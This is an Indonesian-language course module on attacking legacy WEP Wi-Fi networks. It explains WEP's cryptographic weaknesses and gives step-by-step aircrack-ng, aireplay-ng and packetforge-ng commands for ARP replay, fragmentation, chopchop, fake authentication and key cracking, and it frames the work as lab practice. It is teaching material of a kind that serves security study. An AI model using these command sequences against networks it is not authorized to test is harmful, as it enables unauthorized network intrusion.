# Modul 14: WEP Attacks

## WEP Weakness dan Vulnerability

- **Definisi**: Wired Equivalent Privacy (WEP) adalah protokol keamanan Wi-Fi lama yang menggunakan enkripsi RC4 dan kunci statis (64-bit atau 128-bit).
- **Kelemahan**:
  - **Initialization Vector (IV) Lemah**: IV 24-bit terlalu pendek, menyebabkan reuse IV yang memudahkan analisis kriptografi.
  - **RC4 Flaws**: Algoritma RC4 rentan terhadap serangan statistik, seperti FMS attack.
  - **Kunci Statis**: Kunci tidak berubah, memungkinkan pengumpulan data untuk cracking.
  - **Integritas Lemah**: CRC-32 mudah dimanipulasi, memungkinkan serangan seperti Chopchop.
- **Kerentanan**:
  - Mudah diretas dengan alat seperti Aircrack-ng dalam hitungan menit.
  - Rentan terhadap serangan replay, fragmentation, dan fake authentication.
- **Status**: Usang, tidak aman, tidak direkomendasikan untuk digunakan.
- **Contoh Penggunaan**: Jaringan lama atau perangkat IoT murah yang masih menggunakan WEP.

## ARP Request Replay Attack

- **Definisi**: Serangan yang menangkap dan mengulang (replay) paket ARP untuk menghasilkan IV baru, mempercepat pengumpulan data untuk cracking WEP.
- **Langkah-langkah**:
  1. Aktifkan monitor mode: `sudo airmon-ng start wlan0`.
  2. Tangkap paket: `sudo airodump-ng --bssid [BSSID] --channel [CHANNEL] --write arp_replay wlan0mon`.
  3. Identifikasi ARP paket: Gunakan Wireshark atau perhatikan data rate di airodump-ng.
  4. Replay ARP: `sudo aireplay-ng --arpreplay -b [BSSID] -h [CLIENT_MAC] wlan0mon`.
  5. Crack kunci dengan data IV yang terkumpul (lihat Cracking WEP).
- **Kelebihan**: Cepat menghasilkan IV, efektif di jaringan dengan lalu lintas rendah.
- **Kekurangan**: Memerlukan klien aktif yang mengirim ARP.
- **Contoh Penggunaan**: Mempercepat cracking WEP di jaringan lab dengan lalu lintas rendah.

## Fragmentation Attack

- **Definisi**: Serangan yang memanipulasi paket WEP untuk merekonstruksi kunci data dengan mengeksploitasi kelemahan enkripsi RC4.
- **Langkah-langkah**:
  1. Aktifkan monitor mode: `sudo airmon-ng start wlan0`.
  2. Tangkap paket: `sudo airodump-ng --bssid [BSSID] --channel [CHANNEL] wlan0mon`.
  3. Lakukan fake authentication: `sudo aireplay-ng --fakeauth 0 -a [BSSID] -h [CLIENT_MAC] wlan0mon`.
  4. Jalankan fragmentation: `sudo aireplay-ng --fragment -b [BSSID] -h [CLIENT_MAC] wlan0mon`.
  5. Gunakan `packetforge-ng` untuk membuat paket ARP: `sudo packetforge-ng --arp -a [BSSID] -h [CLIENT_MAC] -k 255.255.255.255 -l 255.255.255.255 -w arp.cap`.
  6. Replay paket untuk menghasilkan IV.
- **Kelebihan**: Tidak memerlukan banyak lalu lintas asli, efektif di jaringan sepi.
- **Kekurangan**: Memerlukan keahlian teknis dan waktu lebih lama dibandingkan ARP replay.
- **Contoh Penggunaan**: Menyerang jaringan WEP dengan lalu lintas minimal.

## Chopchop Attack

- **Definisi**: Serangan yang mendekripsi paket WEP byte demi byte dengan memanipulasi integritas CRC-32.
- **Langkah-langkah**:
  1. Aktifkan monitor mode: `sudo airmon-ng start wlan0`.
  2. Tangkap paket: `sudo airodump-ng --bssid [BSSID] --channel [CHANNEL] wlan0mon`.
  3. Lakukan fake authentication: `sudo aireplay-ng --fakeauth 0 -a [BSSID] -h [CLIENT_MAC] wlan0mon`.
  4. Jalankan chopchop: `sudo aireplay-ng --chopchop -b [BSSID] -h [CLIENT_MAC] wlan0mon`.
  5. Gunakan output untuk membuat paket ARP dengan `packetforge-ng`.
  6. Replay paket untuk menghasilkan IV.
- **Kelebihan**: Bekerja tanpa klien aktif, menghasilkan kunci data untuk injeksi.
- **Kekurangan**: Lambat, memerlukan waktu untuk mendekripsi setiap byte.
- **Contoh Penggunaan**: Menyerang jaringan WEP tanpa aktivitas klien di lab.

## Fake Authentication

- **Definisi**: Teknik untuk mengelabui AP agar menerima perangkat sebagai klien sah tanpa mengetahui kunci WEP.
- **Langkah-langkah**:
  1. Aktifkan monitor mode: `sudo airmon-ng start wlan0`.
  2. Tangkap data AP: `sudo airodump-ng --bssid [BSSID] --channel [CHANNEL] wlan0mon`.
  3. Lakukan fake authentication: `sudo aireplay-ng --fakeauth 0 -a [BSSID] -h [CLIENT_MAC] wlan0mon`.
- **Kelebihan**: Memungkinkan injeksi paket tanpa autentikasi asli, mendukung serangan lain seperti ARP replay.
- **Kekurangan**: Tidak bekerja pada AP dengan MAC filtering ketat.
- **Contoh Penggunaan**: Mengelabui AP WEP untuk memulai serangan fragmentation di lingkungan lab.

## Cracking WEP dengan Aircrack-ng

- **Definisi**: Proses menggunakan Aircrack-ng untuk memecahkan kunci WEP dari IV yang dikumpulkan.
- **Langkah-langkah**:
  1. Aktifkan monitor mode: `sudo airmon-ng start wlan0`.
  2. Tangkap paket dengan IV: `sudo airodump-ng --bssid [BSSID] --channel [CHANNEL] --write wep_capture wlan0mon`.
  3. (Opsional) Percepat dengan ARP replay, fragmentation, atau chopchop untuk mengumpulkan IV lebih cepat.
  4. Crack kunci: `sudo aircrack-ng -b [BSSID] wep_capture*.cap`.
     - Biasanya membutuhkan 10.000–40.000 IV untuk kunci 64-bit, lebih banyak untuk 128-bit.
  5. Output menunjukkan kunci WEP dalam format heksadesimal (misalnya `1A:2B:3C:4D:5E`).
- **Kelebihan**: Cepat, otomatis, mendukung berbagai metode pengumpulan IV.
- **Kekurangan**: Memerlukan adapter dengan monitor mode dan injeksi, tidak relevan untuk jaringan modern (WPA/WPA3).
- **Catatan Etika**: Hanya lakukan di jaringan yang diizinkan, seperti lab pengujian.
- **Contoh Penggunaan**: Cracking kunci WEP di jaringan lab untuk mendemonstrasikan kerentanan.
